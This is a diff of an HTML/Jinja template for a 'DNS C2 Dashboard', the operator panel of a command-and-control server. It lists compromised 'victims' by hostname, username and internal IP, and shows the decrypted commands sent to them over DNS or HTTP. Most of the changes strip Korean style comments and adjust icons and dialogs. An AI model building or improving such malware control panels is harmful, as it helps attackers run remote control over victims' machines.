@@ -10,43 +10,43 @@
         body { 
             padding-top: 20px; 
             padding-bottom: 20px; 
-            background-color: #2c3034; /* 어두운 배경 */
-            color: #f8f9fa; /* 밝은 텍스트 */
+            background-color: #2c3034;
+            color: #f8f9fa;
         }
         .card { 
-            background-color: #343a40; /* 카드 배경 */
-            border: 1px solid #454d55; /* 카드 테두리 */
+            background-color: #343a40;
+            border: 1px solid #454d55;
             margin-bottom: 20px;
         }
         .card-header, .card-title { 
-            color: #00beef; /* 주요 제목 색상 */
+            color: #00beef;
         }
         .card-header {
             border-bottom: 1px solid #00beef40;
         }
         .table { 
-            color: #f8f9fa; /* 테이블 텍스트 */
-            margin-bottom: 0; /* 카드 내 테이블 여백 조정 */
+            color: #f8f9fa;
+            margin-bottom: 0;
         }
         .table thead th { 
-            background-color: #3E444A; /* 테이블 헤더 배경 */
+            background-color: #3E444A;
             border-color: #454d55; 
-            color: #00beef; /* 테이블 헤더 텍스트 */
+            color: #00beef;
         }
         .btn-danger .fas, .btn-info .fas, .btn-secondary .fas {
             color: white;
         }
         .table tbody td { 
-            background-color: #343a40; /* 테이블 셀 배경 */
+            background-color: #343a40;
             border-color: #454d55; 
-            vertical-align: middle; /* 셀 내용 수직 중앙 정렬 */
+            vertical-align: middle;
         }
         .table-hover tbody tr:hover td {
-            background-color: #3E444A; /* 마우스 오버 시 배경 */
+            background-color: #3E444A;
         }
         .form-control { 
-            background-color: #454d55; /* 입력 필드 배경 */
-            color: #f8f9fa; /* 입력 필드 텍스트 */
+            background-color: #454d55;
+            color: #f8f9fa;
             border-color: #6c757d; 
         }
         .form-control::placeholder { color: #adb5bd; }
@@ -58,21 +58,17 @@
         }
         .btn-primary { background-color: #00beef; border-color: #00beef; }
         .btn-primary:hover { background-color: #00a0c7; border-color: #00a0c7; }
-        .btn-info { background-color: #17a2b8; border-color: #17a2b8; }
-        .btn-secondary { background-color: #6c757d; border-color: #6c757d; }
-        .btn-danger { background-color: #dc3545; border-color: #dc3545; }
         .btn-outline-light { color: #f8f9fa; border-color: #f8f9fa80; }
         .btn-outline-light:hover { background-color: #f8f9fa; color: #2c3034; }
         
-        .results-link { color: #00beef; }
         pre { 
-            background-color: #222528; /* pre 태그 배경 */
+            background-color: #222528;
             color: #f8f9fa; 
             border: 1px solid #454d55; 
             padding: 10px;
             border-radius: 0.25rem;
-            max-height: 150px; /* 최대 높이 제한 */
-            overflow-y: auto; /* 스크롤 추가 */
+            max-height: 150px;
+            overflow-y: auto;
             white-space: pre-wrap;
             word-break: break-all;
         }
@@ -82,11 +78,11 @@
             border-radius: 50%; 
             display: inline-block; 
             margin-right: 7px;
-            border: 1px solid #fff3; /* 테두리 추가 */
+            border: 1px solid #fff3;
         }
-        .status-online { background-color: #28a745; /* 초록색 */ }
-        .status-offline { background-color: #dc3545; /* 빨간색 */ }
-        .status-unknown { background-color: #ffc107; /* 노란색 */ }
+        .status-online { background-color: #28a745; }
+        .status-offline { background-color: #dc3545; }
+        .status-unknown { background-color: #ffc107; }
 
         .victim-online td:first-child { border-left: 4px solid #28a745 !important; }
         .victim-offline td:first-child { border-left: 4px solid #dc3545 !important; }
@@ -94,19 +90,13 @@
 
         .action-buttons form { display: inline-block; margin-left: 5px; }
         .action-buttons .btn-sm { padding: 0.25rem 0.5rem; font-size: 0.875rem; }
-
-        datalist { }
-        input[list]::-webkit-calendar-picker-indicator {
-            opacity: 0.5;
-            cursor: pointer;
-        }
     </style>
 </head>
 <body>
     <div class="container-fluid">
         <div class="card shadow-sm">
             <div class="card-header d-flex justify-content-between align-items-center">
-                <h1 class="mb-0"><i class="fas fa-shield-alt mr-2"></i>DNS C2 Dashboard</h1>
+                <h1 class="mb-0"><i class="fas fa-skull-crossbones mr-2"></i>DNS C2 Dashboard</h1>
                 <a href="{{ url_for('logout') }}" class="btn btn-outline-light btn-sm"><i class="fas fa-sign-out-alt mr-1"></i>Logout</a>
             </div>
         </div>
@@ -167,9 +157,11 @@
                         <tr>
                             <td title="{{ cmd.get('command_id', 'N/A') }}">{{ cmd.get('command_id', 'N/A')[:8] }}...</td>
                             <td>{{ cmd.get('victim_hash', 'N/A') }}</td>
-                            <td><pre>{{ cmd.get('command_string', 'N/A') }}</pre></td>
+                            <td>
+                                <pre title="Encrypted: {{ cmd.get('command_string', 'N/A') }}">{{ cmd.get('command_string_decrypted', 'Decryption Failed') }}</pre>
+                            </td>
                             <td class="command-status-{{ cmd.get('status', 'unknown').lower().replace(' ', '_') }}">
-                                <i class="fas fa-{{ 'check-circle' if 'completed' in cmd.get('status', '') else 'spinner fa-spin' if 'pending' in cmd.get('status', '') or 'delivered' in cmd.get('status', '') else 'exclamation-circle' }} mr-1"></i>
+                                <i class="fas fa-{{ 'check-circle text-success' if 'completed' in cmd.get('status', '') else 'spinner fa-spin' if 'pending' in cmd.get('status', '') or 'delivered' in cmd.get('status', '') else 'exclamation-circle text-warning' }} mr-1"></i>
                                 {{ cmd.get('status', 'N/A') }}
                             </td>
                             <td>{{ cmd.get('submitted_at', '').replace('T', ' ')[:19] if cmd.get('submitted_at') else '' }}</td>
@@ -179,7 +171,7 @@
                                 {% if delivered_dns_time %}
                                     <span title="Via DNS"><i class="fas fa-network-wired mr-1"></i>DNS: {{ delivered_dns_time.replace('T', ' ')[:19] }}</span>
                                 {% elif delivered_http_time %}
-                                    <span title="Via HTTP API"><i class="fas fa-globe mr-1"></i>HTTPS: {{ delivered_http_time.replace('T', ' ')[:19] }}</span>
+                                    <span title="Via HTTP API"><i class="fas fa-globe mr-1"></i>HTTP: {{ delivered_http_time.replace('T', ' ')[:19] }}</span>
                                 {% else %}
                                     -
                                 {% endif %}
@@ -187,7 +179,7 @@
                             <td class="action-buttons">
                                 <a class="btn btn-info btn-sm" href="{{ url_for('view_command_result_page', command_id=cmd.get('command_id'), victim_hash=cmd.get('victim_hash')) }}" title="View Result"><i class="fas fa-eye"></i> Result</a>
                                 <form action="{{ url_for('delete_command', command_id=cmd.get('command_id')) }}" method="post" style="display:inline;">
-                                    <button type="submit" class="btn btn-danger btn-sm" onclick="return confirm('Are you sure you want to delete command {{ cmd.get('command_id')[:8] }}...?');" title="Delete Command">
+                                    <button type="submit" class="btn btn-danger btn-sm" onclick="return confirm('Are you sure?');" title="Delete Command">
                                         <i class="fas fa-trash-alt"></i> Delete
                                     </button>
                                 </form>
@@ -210,26 +202,23 @@
                 <div class="table-responsive">
                     <table class="table table-sm table-hover">
                         <thead>
-                        <tr>
-                            <th>Victim Hash</th>
-                            <th>Status</th>
-                            <th>OS Info</th>
-                            <th>Hostname</th>
-                            <th>Username</th>
-                            <th>Internal IP</th>
-                            <th>First Seen (UTC)</th>
-                            <th>Last Seen (UTC)</th>
-                            <th>Actions</th>
-                        </tr>
+                            <tr>
+                                <th>Victim Hash</th>
+                                <th>Status</th>
+                                <th>OS Info</th>
+                                <th>Hostname</th>
+                                <th>Username</th>
+                                <th>Internal IP</th>
+                                <th>First Seen (UTC)</th>
+                                <th>Last Seen (UTC)</th>
+                                <th>Actions</th>
+                            </tr>
                         </thead>
                         <tbody>
                         {% for victim in victims %}
                         <tr class="{{ 'victim-online' if victim.status == 'Online' else 'victim-offline' if victim.status == 'Offline' else 'victim-unknown' }}">
                             <td title="{{ victim.id }}">{{ victim.display_name }}</td>
-                            <td>
-                                <span class="status-dot {{ 'status-online' if victim.status == 'Online' else 'status-offline' if victim.status == 'Offline' else 'status-unknown' }}"></span>
-                                {{ victim.status }}
-                            </td>
+                            <td><span class="status-dot {{ 'status-online' if victim.status == 'Online' else 'status-offline' if victim.status == 'Offline' else 'status-unknown' }}"></span> {{ victim.status }}</td>
                             <td>{{ victim.get('system_info', {}).get('os', 'N/A') }}</td>
                             <td>{{ victim.get('system_info', {}).get('hostname', 'N/A') }}</td>
                             <td>{{ victim.get('system_info', {}).get('username', 'N/A') }}</td>
@@ -239,7 +228,7 @@
                             <td class="action-buttons">
                                 <a class="btn btn-secondary btn-sm" href="{{ url_for('view_victim_details', victim_hash=victim.id) }}"><i class="fas fa-info-circle mr-1"></i> Details</a>
                                 <form action="{{ url_for('delete_victim', victim_hash=victim.id) }}" method="post" style="display:inline;">
-                                    <button type="submit" class="btn btn-danger btn-sm" onclick="return confirm('Are you sure you want to delete victim {{ victim.id }} and all associated data? This cannot be undone!');" title="Delete Victim">
+                                    <button type="submit" class="btn btn-danger btn-sm" onclick="return confirm('Are you sure?');" title="Delete Victim">
                                         <i class="fas fa-user-slash"></i> Delete
                                     </button>
                                 </form>
